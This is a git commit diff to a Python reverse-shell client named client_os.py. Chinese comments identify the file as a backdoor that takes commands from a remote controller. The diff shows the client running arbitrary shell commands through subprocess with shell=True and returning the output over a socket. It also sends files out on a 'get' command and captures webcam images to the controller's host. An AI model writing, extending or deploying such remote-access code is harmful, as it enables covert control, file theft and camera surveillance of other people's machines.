a4c24969d797becb825710b09e8db2583e3e73b6
jerry <59169357+jerry1233@users.noreply.github.com>
2024-04-21 20:44:12 +0800

    Add files via upload

--- client_os.py
+++ client_os.py
@@ -7,6 +7,7 @@ import threading
 import file_trans
 import cam
 import settings
+import subprocess
 
 #反弹shell客户端
 
@@ -35,16 +36,45 @@ def send_message():
                 except:
                     result = "错误路径"
             elif cmd.startswith("get"):
-                file_trans.send_file_client(cmd[3:].strip(), settings.get_host(), settings,get_file_port())
+                file_trans.send_file_client(cmd[3:].strip(), settings.get_host(), settings.get_file_port())
                 cmd = ""
             elif cmd.startswith("camera"):
                 cam.send_cam_image(settings.get_host(), settings.get_cam_port())
             else:
-                    result = os.popen(cmd).read()  # 获取反馈
+                try:
+                    #服务端（控制端）指令没有cd,camera,get，在shell执行这个指令并返回服务端
+                    #result = os.popen(cmd).read()  # 获取反馈（弃用）
+                    #result = subprocess.getoutput(cmd) #（弃用）
+                    # 使用Popen执行命令
+                    # shell=True表示在shell中执行命令，以支持通配符和管道
+                    # stdout=subprocess.PIPE表示将命令的标准输出捕获到变量中
+                    # stderr=subprocess.PIPE表示将命令的错误输出捕获到变量中
+                    # universal_newlines=True表示输出将被解码为文本
+                    # print("获取的命令：" + cmd) #调试用
+                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                    stdout, stderr = process.communicate(timeout=10) # 从标准输出和标准错误中获取输出和错误
+                    return_code = process.returncode # 检查命令是否成功执行（返回值为0表示成功，非0表示出错）
+                    if return_code == 0:
+                        # 打印命令的标准输出
+                        #print("Command output:") #调试用
+                        #print(stdout) #调试用
+                        result = stdout
+                        cmd = ""
+                    else:
+                        # 打印命令的错误输出
+                        #print("Command failed with error:") #调试用
+                        #print(stderr) #调试用
+                        result = stderr
+                        cmd = ""
+                except:
+                    process.terminate() #timeout=10 超时异常结束指令进程
+                    process.wait(timeout=2) #确保进程在终止后已经完成
                     cmd = ""
+                    result = "10s内超时异常，已结束进程"
             if result:
                 try:
                     client_socket.sendall(result.encode('utf-8'))  # 编码发送反馈
+                    result = ""
                 except:
                     pass
             elif not result:
